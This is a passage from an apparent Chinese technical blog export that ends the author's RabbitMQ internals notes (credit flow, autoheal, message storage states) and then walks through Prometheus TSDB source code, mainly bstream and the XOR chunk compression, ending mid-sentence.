handle_bump_msg/1。发送者会阻塞当每次检查clocked/0函数都是为0，如果一个进程即是发送者也是接收者，当他被阻塞的时候，那么他就不会授权更多的credit给他的发送者。因此只有需要检查blocked/0的进程才需要去读取网络sockets。\n\n%% RabbitMQ系统设置的当前进程能够发送给下游进程消息的最大数为200\n\n%% RabbitMQ系统设置下游进程在接收上游进程发送的50条消息后，需要通知上游进程增加能够向下游进程发送消息的数量上限\n\n%% 每次通知上游进程增加向下游进程的发送消息的数量也为50\n\n3）autoheal \n\nheal: 治愈\n\n为了去autoheal我们需要：\n\n1. 找到获胜的分区\n2. 其他分区停止所有的节点\n3. 等待他们所有都停止\n4. 启动他们\n\n过程：\n\n1. 当Mnesia检测出集群出现分区，则从集群中找到第一个节点作为leader节点进行autoheal操作\n2. Leader节点找出胜利进程和失败进程，胜利者节点收到Leader节点发送过来通知自己成为胜利者的消息\n3. 胜利者节点通知所有的失败者进程自己是Winner节点，然后失败者节点新启动一个进程进行rabbit应用的重启\n4. 当胜利者节点收取到了所有失败者节点的停止后，立刻向所有失败者节点上的新启动的进程发送autoheal_safe_to_start消息，通知失败者节点重新启动rabbit应用\n5. Leader进程向胜利者进程发送report_autoheal_status消息\n6. 胜利者进程通知Leader进程autoheal操作结束\n\n4）消息存储过程\n\n![img](/images/1253350-20180608102448767-1819151383.jpg)\n\nrabbit_channel进程确定了消息将要投递的目标队列，rabbit_amqqueue_process是队列进程，每个队列都有一个对应的进程，实际上rabbit_amqqueue_process进程只是提供了逻辑上对队列的相关操作，他的真正操作是通过调用指定的backing_queue模块提供的相关接口实现的，默认情况该backing_queue的实现模块为rabbit_variable_queue。\n\n对于普通的没有设置优先级和镜像的队列来说，backing_queue的默认实现是rabbit_variable_queue，其内部通过5个子队列Q1、Q2、Delta、Q3和Q4来实现这4个状态的转换\n\n![img](/images/1253350-20180608102522017-95525574.jpg)\n\n其中Q1、Q4只包含alpha状态的消息，Q2和Q3包含Beta和gamma状态的消息，Delta只包含delta状态的消息\n\n在rabbit中，队列中的消息可能会处理以下四种状态：\n\nalpha：消息内容以及消息在队列中的位置（消息索引）都保存在内存中；\n\nbeta：消息内容只在磁盘上，消息索引只在内存中；\n\ngamma：消息内容只在磁盘上，消息索引在内存和磁盘上都存在；\n\ndelta：消息的内容和索引都在磁盘上。\n\n注意：对于持久化消息，消息内容和消息索引都必须先保存在磁盘上，然后才处于上述状态中的一种。其中gamma很少被用到，只有持久化的消息才会出现这种状态。\n\nrabbit提供这种分类的主要作用是满足不同的内存和CPU需求。alpha最耗内存，但很少消耗CPU；delta基本不消耗内存，但是要消耗更多的CPU以及磁盘I/O操作（delta需要两次I/O操作，一次读索引，一次读消息内容；delta及gamma只需要一次I/O操作来读取消息内容）。\n\nrabbit在运行时会根据统计的消息传送速度定期计算一个当前内存中能够保存的最大消息数量（target_ram_count），如果内存中的消息数量大于这个数量，就会引起消息的状态转换，转换主要两种：alpha -> beta， beta -> delta。alpha -> beta的转换会将消息的内容写到磁盘（如果是持久化消息，在这一步转换后，消息将会处于gamma状态），beta -> delta的转换会更进一步减少内存消耗，将消息索引也写到磁盘。\n\n### 总结\n\nMQ中还有很多重要的特性，还需要后续继续分析学习了。。。。todo...\n\n\n\n\n\n\n\n\n\n","tags":["rabbitmq"],"categories":["rabbitmq"]},{"title":"tsdb源码学习","url":"/2020/10/10/tsdb源码学习/","content":"\n\n\n# tsdb源码学习\n\ntsdb项目结构：\n\n```shell\n├── Documentation\n│   └── format\n│       ├── chunks.md\n│       ├── index.md\n│       └── tombstones.md\n├── LICENSE\n├── README.md\n├── block.go\n├── block_test.go\n├── chunkenc\n│   ├── bstream.go\n│   ├── chunk.go\n│   ├── chunk_test.go\n│   └── xor.go\n├── chunks\n│   └── chunks.go\n├── cmd\n│   └── tsdb\n│       ├── Makefile\n│       ├── README.md\n│       └── main.go\n├── compact.go\n├── compact_test.go\n├── db.go\n├── db_test.go\n├── encoding_helpers.go\n├── fileutil\n│   ├── dir_unix.go\n│   ├── dir_windows.go\n│   ├── fileutil.go\n│   ├── mmap.go\n│   ├── mmap_unix.go\n│   ├── mmap_windows.go\n│   ├── preallocate.go\n│   ├── preallocate_darwin.go\n│   ├── preallocate_linux.go\n│   ├── preallocate_other.go\n│   ├── sync.go\n│   ├── sync_darwin.go\n│   └── sync_linux.go\n├── head.go\n├── head_test.go\n├── index\n│   ├── encoding_helpers.go\n│   ├── index.go\n│   ├── index_test.go\n│   ├── postings.go\n│   └── postings_test.go\n├── labels\n│   ├── labels.go\n│   ├── labels_test.go\n│   └── selector.go\n├── querier.go\n├── querier_test.go\n├── test\n│   ├── conv_test.go\n│   ├── hash_test.go\n│   └── labels_test.go\n├── testdata\n│   └── 20kseries.json\n├── testutil\n│   └── testutil.go\n├── tombstones.go\n├── tombstones_test.go\n├── tsdbutil\n│   ├── buffer.go\n│   └── buffer_test.go\n├── wal.go\n└── wal_test.go\n```\n\n## bstream\n\nbstream结构体就是Prometheus TSDB中的基础组件之一，它是对 byte切片的封装，提供了读写bit位的功能，主要用于读写时序数据。bstream结构体其核心字段定义如下：\n\n- **stream（[]byte类型）**：用于记录数据的byte切片。\n- **count（uint8类型）**：在写入数据的时候，是逐个byte进行操作的，count字段用来记录当前byte中有多少个bit位是可以写入的，在读取数据的时候，表示当前byte中有多少个bit位是可读的。也就是说，count字段类似于控制写入/读取位置的下标。\n\n```go\n// bstream is a stream of bits.\ntype bstream struct {\n\tstream []byte // the data stream\n\tcount  uint8  // how many bits are valid in current byte\n}\n```\n\n首先是writeByte()方法，它提供了写入一个byte的功能，其工作原理如图2-2所示。在图2-3（a）中每次正好写入stream切片的一个元素。需要注意图2-3（b）中展示的这种场景，待写入byte值的高位（10）会写入到bstream.stream切片中的第二个byte元素中，低位（100101）会写入到第三个byte元素中。\n\n![img](https://pic4.zhimg.com/80/v2-84d3210214a9b2aea184bc6c7c2c7dcf_hd.jpg)\n\nbstream.writeByte()方法的具体实现如下。注意，在通过writeByte()方法写入byte之后，bstream.count字段的值是不需要改变的。\n\n```go\nfunc (b *bstream) writeByte(byt byte) {\n\tif b.count == 0 {\n        //当前bstream已经完整写完了一个byte, 需要向stream切片中追加一个新的byte元素来完成此次写入\n\t\tb.stream = append(b.stream, 0)\n\t\tb.count = 8\n\t}\n\n\ti := len(b.stream) - 1\n\n    // 再stream切片末尾写入byt\n\t// fill up b.b with b.count bits from byt\n\tb.stream[i] |= byt >> (8 - b.count)\n\n    //如果stream切片中最后一个byte元素剩余的bit位不足8，则需要追加一个byte写入byt剩余的bit位\n\tb.stream = append(b.stream, 0)\n\ti++\n\tb.stream[i] = byt << b.count\n}\n```\n\nbstream.writeBit()方法负责完成一个bit的写入，同时也会更新bstream.count字段，具体实现如下所示：\n\n```go\nfunc (b *bstream) writeBit(bit bit) {\n if b.count == 0 {\n // 当前bstream已经完整写完一个byte，需要向stream切片中追加新的byte元素来完成此次写入\n b.stream = append(b.stream, 0)\n b.count = 8\n }\n i := len(b.stream) - 1 // 最后一个byte元素的下标\n if bit { // 如果bit为1，则需要将该byte元素中对应的位设置为1，如果为0，则不需要设置\n b.stream[i] |= 1 << (b.count - 1)\n }\n b.count-- // 写入一个bit之后，更新当前byte可用位的数量\n}\n```\n\n另外，writeBits()方法实现了写入一个uint64值的功能，当该值所占的bit位数超过8个时，会首先调用writeByte()方法，按照每8位一个byte的方式写入，然后再调用writeBit()方法写入剩余不足8位的bit值，其实现比较简单，这里不再展开详细介绍。\n\n介绍完bstream中提供的写入方法之后，下面继续分析bstream中读取相关的方法。首先是readByte()方法，该方法负责读取一个8位的byte，其大致原理如图2-4所示：\n\n![img](https://pic1.zhimg.com/80/v2-70afd99abb582636ac6466d9d888a91c_hd.jpg)\n\nbstream.readByte()方法实现如下：\n\n```go\nfunc (b *bstream) readByte() (byte, error) {\n // 检测当前stream切片是否为空(略)\n // 读取数据时会首先将bstream.count初始化为8，所以会先读取stream切片中的第一个元素\n if b.count == 8 { \n b.count = 0 // 将count更新为0\n return b.stream[0], nil\n }\n\n if b.count == 0 { // count为0表示当前stream切片中的第一个元素已经被读取完毕\n b.stream = b.stream[1:] // 截掉stream切片中第一个byte元素\n // 重新检测stream切片是否为空(略)\n return b.stream[0], nil // 返回stream切片中的第一个byte元素\n }\n\n // 如果count不等于0或8，则此次读取的8个bit需要跨两个byte元素\n byt := b.stream[0] << (8 - b.count) // 从第一个byte元素中读取剩余可读取的bit\n b.stream = b.stream[1:] // 截掉stream切片中的第一个byte元素\n // 检测stream切片是否为空(略)\n // 截断之后，再次读取stream中第一个byte元素，凑齐8个bit\n byt |= b.stream[0] >> b.count\n return byt, nil\n}\n```\n\n再来看bstream.readBit()方法，它主要实现了读取单个bit位的功能，具体实现如下所示：\n\n```go\nfunc (b *bstream) readBit() (bit, error) {\n if len(b.stream) == 0 {\n return false, io.EOF\n }\n // 检测当前stream切片是否为空(略)\n if b.count == 0 { // count为0表示stream切片中的第一个byte元素已读取完毕\n b.stream = b.stream[1:] // 截掉第一个byte元素\n\n if len(b.stream) == 0 {\n return false, io.EOF\n }\n b.count = 8 // 将count字段重置为8\n }\n // 读取第一个bit位\n d := (b.stream[0] << (8 - b.count)) & 0x80\n b.count-- // 递减count字段，表示该byte中剩余可读取的bit数\n return d != 0, nil\n}\n```\n\n另外，与writeBits()方法对应的是readBits()方法，它实现了一次读取多个bit位的功能，当读取的bit个数超过8个，则首先通过readByte()方法按照byte进行读取，之后当需要读取的bit个数不足8个时，则会调用readBit()方法逐个读取bit值，其实现比较简单，这里不再展开详细介绍。\n\n## Chunk接口\n\n在上一篇文章中提到，在磁盘存储中每个block中的时序数据存储在chunk文件中。Prometheus TSDB中对应的抽象是Chunk接口，它表示一组时序点的集合，其定义如下所示。Chunk接口有两个紧密相关的接口：Append接口和Iterator接口，我们可以通过该Append接口向Chunk中追加时序点，也可以通过Iterator接口迭代Chunk中存储的时序点。\n\n```go\ntype Chunk interface {\n Bytes() []byte // 存储时序点的byte切片，通过前面介绍的bstream完成读写\n Encoding() Encoding // 编码类型，目前只有XOR这一种编码类型\n Appender() (Appender, error) // 返回该Chunk关联的Appender实例 \n Iterator() Iterator // 返回该Chunk关联的Iterator实例\n NumSamples() int // 返回该Chunk中保存时序点的个数\n}\n```\n\n这里的Append接口和Iterator接口的定义都比较简单，如下所示。Append接口中只有一个Append()方法，用于向Chunk实例中追加一个时序点，其接收的参数分别是时序点的timestamp和value值。Iterator与我们常见的迭代器类似。\n\n```go\ntype Appender interface {\n Append(int64, float64)  // 每个时序点都是有对应的timestamp和value值组成的\n}\n\ntype Iterator interface {\n At() (int64, float64) // 返回当前时序点的timestamp和value值\n Err() error // 返回迭代过程中发生的异常\n Next() bool // 检测后续是否有时序点可以继续迭代\n}\n```\n\n## XORChunk实现\n\nXORChunk是Prometheus TSDB实现中Chunk接口的唯一实现，它只有b（*bstream类型）一个字段，主要用于存储时序数据。XORChunk关联的Appender接口实现为xorAppender，其核心字段如下：\n\n- **b（\\*bstream）**：bstream实例，存储写入的时序点的数据。\n- **t（int64类型）**：记录上次写入时序点对应的timestamp。\n- **v（float64类型）**：记录上次写入时序点对应的value值。\n- **tDelta（uint64类型）：**记录当前点与前一个点的timestamp差值。\n- **leading（uint8）：**记录当前XOR运算结果中前置\"0\"的个数。\n- **trailing**（**uint8**）：记录当前XOR运算结果中后置\"0\"的个数。\n\nXORChunk中只有两个方法需要介绍，一个是XORChunk.iterator()方法，用于创建xorIterator实例，xorIterator实例用于迭代XORChunk中的时序点，iterator()方法的具体实现如下所示：\n\n```go\nfunc (c *XORChunk) iterator() *xorIterator {\n return &xorIterator{\n // bstream中前两个byte元素存储的是XORChunk中时序点的个数，所以这里要跳过\n br: newBReader(c.b.bytes()[2:]),\n // 读取bstream中前两个byte元素，获取XORChunk实例中存储的时序点的个数\n numTotal: binary.BigEndian.Uint16(c.b.bytes()),\n }\n}\n```\n\n另一个方法是XORChunk.Appender()方法，用于创建xorAppender实例，xorAppender负责向该XORChunk实例中追加时序点，Appender()方法的具体实现如下所示：\n\n```go\nfunc (c *XORChunk) Appender() (Appender, error) {\n it := c.iterator() // 创建xorIterator迭代器\n for it.Next() { // 迭代XORChunk中已有的全部时序点，直至结束，这样才能得到可以写入的正确状态\n }\n\n a := &xorAppender{ // 根据xorIterator迭代器的状态创建xorAppender实例\n b: c.b,\n t: it.t,\n v: it.val,\n tDelta: it.tDelta,\n leading: it.leading,\n  trailing: it.trailing,\n }\n if binary.BigEndian.Uint16(a.b.bytes()) == 0 {// 如果是空XORChunk会初始化leading\n a.leading = 0xff\n }\n return a, nil\n}\n```\n\n## **xorAppender**\n\n下面来看xorAppender.Append()方法的具体实现，其参数是待写入时序点的timestamp和value值，这里会按照前面介绍的delta-of-delta时间戳压缩方式存储timestamp，按照XOR压缩方式存储value值。\n\n```go\nfunc (a *xorAppender) Append(t int64, v float64) {\n var tDelta uint64\n // XORChunk会使用bstream中前两个byte记录已写入的时序点的个数，这里就是读取该值\n num := binary.BigEndian.Uint16(a.b.bytes())\n\n if num == 0 { // 每个XORChunk中需要完整记录第一个点的timestamp和value值\n buf := make([]byte, binary.MaxVarintLen64) // 创建一个足够存储timestamp的byte切片\n \n for _, b := range buf[:binary.PutVarint(buf, t)] {// 将timestamp完整写入到bstream中\n a.b.writeByte(b)\n }\n a.b.writeBits(math.Float64bits(v), 64) // 将第一个时序点的value值写入到bstream中\n } else if num == 1 { // 根据num判断，此次写入的是第二个时序点\n tDelta = uint64(t - a.t) // 计算该点与前一个时序点的timestamp差值\n // 下面将当前时序点与前一个时序点的timestamp差值写入到bstream中\n buf := make([]byte, binary.MaxVarintLen64)\n for _, b := range buf[:binary.PutUvarint(buf, tDelta)] {\n  a.b.writeByte(b)\n }\n // 计算该时序点与前一个时序点value值的XOR值，并按照前面介绍的压缩方式记录到bstream中，\n // xorAppender.writeVDelta()方法的具体实现在后面进行详细介绍\n a.writeVDelta(v) \n } else { // 根据num判断，写入第三个以及之后的时序点\n tDelta = uint64(t - a.t) // 计算该时序点与前一个时序点的timestamp差值\n dod := int64(tDelta - a.tDelta) // 计算两个timestamp的dod（delta-of-delta）值\n\n switch {\n case dod == 0: // 如果dod差值为0，则只需要记录一个值为\"0\"的bit值\n a.b.writeBit(zero)\n case bitRange(dod, 14): \n // 如果dod值在[-8191, 8192]范围中，则使用\"10\"作为标识，然后使用14个bit位存储dod值\n a.b.writeBits(0x02, 2)\n a.b.writeBits(uint64(dod), 14)\n case bitRange(dod, 17):\n // 如果dod值在[-65535, 65536]范围中，则使用\"110\"作为标识，然后使用17个bit位存储dod值\n a.b.writeBits(0x06, 3) \n a.b.writeBits(uint64(dod), 17)\n case bitRange(dod, 20):\n // 如果dod值在[-524287, 524288]范围中，则使用\"1110\"作为标识，然后使用20位存储dod值\n a.b.writeBits(0x0e, 4)\n a.b.writeBits(uint64(dod), 20)\n default: // 如果dod值超出了上述返回，则使用\"1111\"作为标识，然后使用64个bit位存储dod值\n a.b.writeBits(0x0f, 4)\n a.b.writeBits(uint64(dod), 64)\n  }\n a.writeVDelta(v) // 计算当前时序点与前一个时序点value值的XOR，并记录到bstream中\n }\n\n a.t = t // 更新t、v字段，记录当前时序点的时间戳和value值，为下一个时序点的写入做准备\n a.v = v\n binary.BigEndian.PutUint16(a.b.bytes(), num + 1) // 更新该XORChunk已写入的点的个数\n a.tDelta = tDelta // 记录当前时序点和前一个时序点的timestamp差值，为下次计算dod值做准备\n}\n```\n\n通过对xorAppender.Append()方法的分析，我们了解了Prometheus TSDB对timestamp压缩的具体实现。接下来深入分析xorAppender.writeVDelta()方法，看Prometheus TSDB如何实现对value值的压缩。在writeVDelta()方法中，会计算当前时序点的value值与前一时序点的value值的XOR值，并根据XOR运算结果值中前置“0”和后置“0”的个数进行相应的压缩存储，具体的压缩规则在上一节已经介绍过了，这里重点看一下writeVDelta()方法对该压缩方式的实现。\n\n```go\nfunc (a *xorAppender) writeVDelta(v float64) {\n // 计算当前时序点的value值与前一个时序点的value值之间的XOR值\n vDelta := math.Float64bits(v) ^ math.Float64bits(a.v)\n\n if vDelta == 0 { // 如果两个时序点的value值相同，则只写入一个值为\"0\"的bit位\n a.b.writeBit(zero)\n return\n }\n a.b.writeBit(one) // 写入控制位的第一个bit位，该位的值为\"1\"\n leading := uint8(bits.LeadingZeros64(vDelta)) // 返回vDelta中前置\"0\"的个数\n trailing := uint8(bits.TrailingZeros64(vDelta)) // 返回vDelta中后置\"0\"的个数\n if a.leading != 0xff && leading >= a.leading && trailing >= a.trailing {\n // 该vDelta值的前置\"0\"和后置\"0\"的个数都比上一次写入得到XOR值多\n a.b.writeBit(zero) // 写入控制位的第二个bit位，该位的值为\"0\"\n // 这里只需要记录除去前置\"0\"和后置\"0\"的部分即可\n a.b.writeBits(vDelta>>a.trailing, 64-int(a.leading)-int(a.trailing))\n } else { // 该vDelta值的前置\"0\"或是后置\"0\"比上一次写入得到的XOR值少\n // 更新xorAppender的leading和trailing的字段，分别记录此次写入时得到的XOR值中前置\"0\"\n // 和后置\"0\"个数，这主要是为下一个时序点的写入做准备\n a.leading, a.trailing = leading, trailing \n a.b.writeBit(one) // 写入控制位的第二个bit位，该位的值为\"1\"\n a.b.writeBits(uint64(leading), 5) // 用5个bit位来存储XOR值中前置0的数量\n sigbits := 64 - leading - trailing\n a.b.writeBits(uint64(sigbits), 6) // 用6个bit位来存储XOR值中间非0位的长度\n a.b.writeBits(vDelta>>trailing, int(sigbits)) // 存储中间非0位的值\n }\n}\n```\n\n**xorIterator**\n\n到此为止，时序点的写入到Chunk实例的具体实现就分析完了。接下来要看的是xorIterator结构体，它是上一小节提到的Iterator接口的唯一实现，主要负责从Chunk中读取时序点，其核心字段如下所示：\n\n- **br（\\*bstream类型）**：关联XORChunk实例中的b字段，存储了XORChunk实例中的时序数据。\n- **numTotal（uint16类型）**：关联XORChunk中存储的时序点的个数\n- **numRead（uint16类型）**：通过该xorIterator实例读取的时序点的个数。\n- **t（int64类型）**：当前读取的时序点的timestamp。\n- **val（float64类型）**：当前读取的时序点的value值。\n- **leading（uint8类型）**：当前读取到的XOR值的前置\"0\"个数。\n- **trailing（uint8类型）**：当前读取到的XOR值的后置\"0\"个数。\n- **tDelta（uint64类型）**：记录当前时序点与前一个时序点的timestamp的差值。\n\nNext()方法是xorIterator的核心方法之一，它会根据当前读取的是第几个时序点决定如何返回正确的timestamp和value值，先来看timestamp的读取过程如下：\n\n- 如果读取的是第一个时序点，则其timestamp和value值没有被压缩，直接读取即可。\n- 如果读取的是第二个时序点，则需要第二个时序点与第一个时序点的timestamp差值，然后根据第一个点的timestamp以及timestamp差值，计算得出第二个时序点的timestamp。\n- 如果读取的是第三个以及之后的时序点，则需要读取dod（delta-of-delta）值，然后根据前两个时序点的timestamp差值以及dod值，得出该时序点的timestamp。\n\n```go\nfunc (it *xorIterator) Next() bool {\n // 检测迭代过程中是否出现异常，则返回false，停止整个迭代过程(略)\n // 检测numRead字段值，如果该xorIterator已经读取完全部的时序点，也会返回false(略)\n if it.numRead == 0 { // 读取XORChunk实例中第一个时序点\n t, err := binary.ReadVarint(it.br) // 从bstream中读取第一个时序点的完整timestamp\n v, err := it.br.readBits(64) // 从bstream中读取第一个时序点完整的value值\n it.t = t // 更新t、val字段，记录当前时序点的timestamp和value值，在At()方法中会返回这两个值\n it.val = math.Float64frombits(v)\n it.numRead++ // 递增已读取的点的个数\n return true\n }\n if it.numRead == 1 { // 读取XORChunk中第二个时序点\n  // 从bstream中读取第二个点与第一个点的timestamp差值\n tDelta, err := binary.ReadUvarint(it.br)\n it.tDelta = tDelta // 更新tDelta字段，记录timestamp差值\n it.t = it.t + int64(it.tDelta) // 计算第二个时序点对应的timestamp\n // 读取第二个时序点的value值，xorIterator.readValue()方法的具体内容在后面详细介绍\n return it.readValue()\n }\n // 在读取XORChunk中第三个时序点以及之后的时序点时，会执行下面的逻辑\n var d byte\n for i := 0; i < 4; i++ { // 首先读取标识位\n d <<= 1 // 将d左移一位，为读取下一位做准备\n bit, err := it.br.readBit()\n if bit == zero { // 在读取标识位的过程中遇到\"0\"位，则表示标识位已经读取结束\n  break\n }\n d |= 1 // 该bit位不为\"0\"，则将对应bit位设置为1\n }\n var sz uint8 // 后续需要读取多少个bit位，才能得到dod(delta-of-delta)值\n var dod int64\n switch d { // 如果标识位为\"0\"，则表示时间戳的dod(delta-of-delta)值为0\n case 0x00:\n // dod == 0\n case 0x02: // 如果标识位为\"10\"，则表示时间戳的dod值在[-8191, 8192]范围中，需要读取14个bit位\n sz = 14\n case 0x06: \n // 如果标识位为\"110\"，则表示时间戳的dod值在[-65535, 65536]范围中，需要读取17个bit位\n sz = 17 \n case 0x0e: \n // 如果标识位为\"1110\"，则表示时间戳的dod值在[-524287, 524288]范围中，需要读取20个bit位\n sz = 20\n case 0x0f: // 如果标识位为\"1111\"，则表示时间戳的dod值超出了上述范围，需要读取64个bit位\n bits, err := it.br.readBits(64)\n dod = int64(bits)\n }\n\n if sz != 0 { // 标识位为\"10\"、\"110\"、\"1110\"，则读取指定的数量的bit位，获得dod值\n bits, err := it.br.readBits(int(sz))\n dod = int64(bits)\n }\n  it.tDelta = uint64(int64(it.tDelta) + dod) // 计算两个点的时间戳的差值\n it.t = it.t + int64(it.tDelta) // 根据上一点的时间戳计算当前点的时间戳\n return it.readValue() // readValue()方法的具体内容在后面详细介绍\n}\n```\n\n在xorIterator.Next()方法读取timestamp的同时，还会调用readValue()方法读取时序点的value值。在readValue()方法中首先会读取控制位，然后根据控制位确定value值，其具体步骤如下所示：\n\n1. 如果控制位的第一个bit位为“0”，则表示当前时序点的value值与前一个value值相同，后续无需进行任何读取操作。否则，读取控制位的第二个bit位。\n2. 如果控制位的第二个bit位为“0”，则表示当前XOR结果的前置“0”和后置“0”与前一个XOR结果的个数相同，后续直接读取当前XOR结果中间非零部分即可。\n3. 如果控制位的第二个bit位为“1”，则需要先读取当前XOR结果中前置“0”的个数，然后读取XOR结果中间非零部分的长度，最后读取中间非零部分的值。\n4. 最后根据前一个点的value值以及XOR运算结果，得到当前点的value值。\n\n下面是xorIterator.readValue()方法的具体实现分析：\n\n```go\nfunc (it *xorIterator) readValue() bool {\n bit, err := it.br.readBit() // 读取控制位的第一个bit位\n if bit == zero { \n // 如果控制位第一个bit位为\"0\"，则表示当前时序点的value值与前一个点的value值相同\n } else {\n bit, err := it.br.readBit() // 如果控制位第一个bit位为\"1\"，则需要读取第二个控制位\n if bit == zero { \n // 控制位为\"10\"，则表示可以直接读取XOR值的中间非0部分(因为其前置\"0\"和后置\"0\"与前一个\n  // XOR结果的个数相同)\n } else { // 控制位为\"11\"，则表示XOR结果中前置\"0\"和后置\"0\"与前一个XOR值的个数相同\n bits, err := it.br.readBits(5) // 读取XOR结果中前置\"0\"的个数(5个bit位)\n it.leading = uint8(bits) // 更新leading字段，记录前置\"0\"的个数\n bits, err = it.br.readBits(6) // 读取XOR结果中非0部分的长度(6个bit位)\n mbits := uint8(bits)\n if mbits == 0 {\n mbits = 64\n }\n it.trailing = 64 - it.leading - mbits // 计算XOR结果中后置\"0\"的个数\n }\n mbits := int(64 - it.leading - it.trailing) // 计算XOR值中非0部分的位数\n bits, err := it.br.readBits(mbits) // 读取XOR结果中非0部分\n // 根据前一个时序点的value值以及XOR值，得到当前点的value值\n vbits := math.Float64bits(it.val) \n vbits ^= (bits << it.trailing)\n it.val = math.Float64frombits(vbits) // 更新val字段\n }\n it.numRead++ // 此次读取完成，递增numRead字段\n return true\n}\n```\n\n从前面对xorIterator.Next()方法以及readValue()方法的分析我们可以看到，xorIterator在迭代过程中始终使用t和val字段记录当前时序点的timestamp和value值，在xorIterator.At()方法中也是始终返回这两个字段值，其实现比较简单，这里不再展开介绍。\n\n### Pool\n\n结构体pool是一个内存中的XORChunk实例池，其底层是基于sync.Pool实现的。这里简单介绍一下Golang中的sync.Pool，Golang除了像JVM那样提供了一些垃圾回收的机制，还提供了很多避免产生垃圾对象的机制，例如这里介绍的池化技术。\n\n在Golang标准库的很多包中，都使用了对象池来避免产生过多的垃圾对象，例如我们经常使用的fmt包、regexp包等，都各自实现了对象池，且它们的实现都很类似。另外，这种对象池的实现都不会释放内存，这就会与垃圾收集器的思想产生冲突，在某些场景中导致内存使用过高。\n\n就上述问题，曾有人建议在sync包里加入一个公开的池类型供大家复用。当然，这也面临很多问题，例如，这个池类型应该放到标准库中吗？如果放到标准库中，应该公开吗？这个池类型的实现应该释放内存吗？如果需要释放内存，那在什么时机释放？这个新增的类型应该叫做Cache还是Pool？\n\n这里可以先简单区分一下Cache和Pool的区别。读者可以将Cache理解成一个全局的Map，我们可以根据不同的Key获取到不同的Value，而Pool中的存储的元素完全一样，与刚初始化完成的实例完全一样。另外，Cache会使用不同的过期算法进行清理，例如LRU、LFU、LIRS等等。\n\n大家特别关心另一个点是Pool在何时释放内存。有人建议在GC之前进行释放，也有人建议在在GC之后进行释放，还有人提出基于过期时间或者使用弱引用的方式。虽然这些建议都有自己的理由，但同时也都有一些弊端。最终，Golang官方决定在垃圾收集时释放Pool占用的内存空间，也就是说，Pool中的对象是在两次垃圾收集之间进行重用的。而且，这也突出了Pool的目的是让垃圾回收变得更加高效，而不是避免垃圾回收。\n\n大致了解了sync.pool的设计初衷和目标之后，我们来看Prometheus TSDB中Pool接口的定义，如下所示：\n\n```go\ntype Pool interface {\n Put(Chunk) error // 将Chunk实例放回到池中\n Get(e Encoding, b []byte) (Chunk, error) // 根据指定的Encoding从池中获取Chunk实例\n}\n```\n\n在Prometheus TSDB中提供了该Pool接口的唯一实现——结构体pool，其底层依赖Golang sync.Pool实现，其NewPool()方法实际上就是初始化sync.Pool实例，如下所示：\n\n```go\nfunc NewPool() Pool {\n return &pool{\n xor: sync.Pool{\n // 如果调用Pool.Get()方法从池中获取对象时没有可用的Chunk实例，则会通过该函数\n // 创建新的XORChunk实例返回\n New: func() interface{} { return &XORChunk{b: &bstream{}} },\n },\n }\n}\n```\n\n结构体pool的Get()方法和Put()方法会先检测Chunk实例的类型，然后调用sync.Pool实现从池中读取Chunk实例以及向池中放回Chunk实例的功能，大致实现如下所示：\n\n```go\nfunc (p *pool) Get(e Encoding, b []byte) (Chunk, error) {\n switch e {\n  case EncXOR:\n c := p.xor.Get().(*XORChunk) // 从Pool中获取XORChunk实例\n c.b.stream = b // 填充bstream\n c.b.count = 0\n return c, nil\n }\n return nil, errors.Errorf(\"invalid encoding %q\", e)\n}\n\nfunc (p *pool) Put(c Chunk) error {\n switch c.Encoding() {\n case EncXOR:\n xc, ok := c.(*XORChunk) // 检测传入的Chunk实例的实际类型\n xc.b.stream = nil // 清空XORChunk底层的bstream\n xc.b.count = 0\n p.xor.Put(c) // 将XORChunk实例放入到Pool中\n default:\n return errors.Errorf(\"invalid encoding %q\", c.Encoding())\n }\n return nil\n}\n```\n\n### Meta元数据\n\n通过上一小节的介绍，我们了解到Chunk中存储的都是时序数据，每个Chunk实例都有一些关联的元数据信息，例如Chunk实例所覆盖的时间范围，这些元数据记录到了Meta实例中。结构体Meta的核心字段如下：\n\n- **Ref（uint64类型）**：Ref字段记录了关联Chunk在磁盘上的位置信息，主要用于读取。\n- **Chunk（chunkenc.Chunk类型）**：指向XORChunk实例。在后面介绍ChunkWriter时会看到，在将Chunk中时序数据持久化到文件时，该字段必须有值。\n- **MinTime、MaxTime（int64类型）**：MinTime和MaxTime两个字段记录了Chunk实例所覆盖的时间范围。\n\nMeta结构体中提供了两个辅助方法，一个是writeHash()方法，它负责为关联的Chunk计算Hash值。另一个方法是OverlapsClosedInterval()方法，该方法用于确定给定的时间范围是与关联Chunk实例所覆盖的时间范围有重合。如图2-5所示，三种场景下，给定的时间范围都与Chunk有重合。\n\n![img](https://pic3.zhimg.com/80/v2-dbbb8ff29b8dacff29e341677ea5fcea_hd.jpg)\n\nMeta结构体中的这两个方法的实现比较简单，这里不再粘贴代码。\n\n### ChunkWriter\n\n通过前面小节的介绍，我们了解到Prometheus TSDB是如何在内存中组织时序数据的，那么这些内存中的时序数据是如何持久化到磁盘上呢？时序数据在磁盘上的组织方式又是什么样子的呢？本小节将通过对ChunkWriter 接口及其实现的分析来解答这些问题。\n\nChunkWriter是Prometheus TSDB中负责时序数据持久化的接口之一，通过该接口的定义（如下）可以看到其最核心的方法是WriteChunks()，该方法的主要功能就是持久化多个Chunk实例中的时序数据。\n\n```go\ntype ChunkWriter interface {\n WriteChunks(chunks ...chunks.Meta) error\n Close() error // 关闭底层关联的文件资源\n}\n```\n\n这里注意WriteChunks()方法的参数，传入的是多个Meta实例，WriteChunks()方法要求每个Meta实例的Chunk字段必须有值。在完成写入之后，Meta实例的Ref字段也会被自动赋值，用于后面进行读取操作。\n\nchunks.Writer结构体实现了上述ChunkWriter接口，在开始分析chunks.Writer持久化时序数据的实现之前，先回顾一下Prometheus TSDB在磁盘上的目录以及文件结构，如图2-6所示。首先来看目录结构，Prometheus在data目录中维护了多个block目录，这些block目录都是以“b-”开头的，以递增编号结尾，每个block目录维护了一个时间段的时序数据以及相关的元数据。在每个block目录下都有一个index文件，其中维护了索引的相关内容，还有一个meta.json文件，其中维护了block目录相关的元数据，这两个文件的内容在后面详细分析。这里重点来看chunks目录，顾名思义，其中存储的就是前面介绍的Chunk实例中存储的时序数据，chunks目录下的每个文件的大小都有上限（defaultChunkSegmentSize），到达上限之后会切换到新文件继续写入时序数据。为了便于描述，笔者将chunks目录下的文件称为“segment文件”，每个segment文件的名称都是以递增序号进行命名的。\n\n![img](https://pic2.zhimg.com/80/v2-2c1185d7638acd6d5bb341e969ace755_hd.jpg)\n\n了解了Prometheus 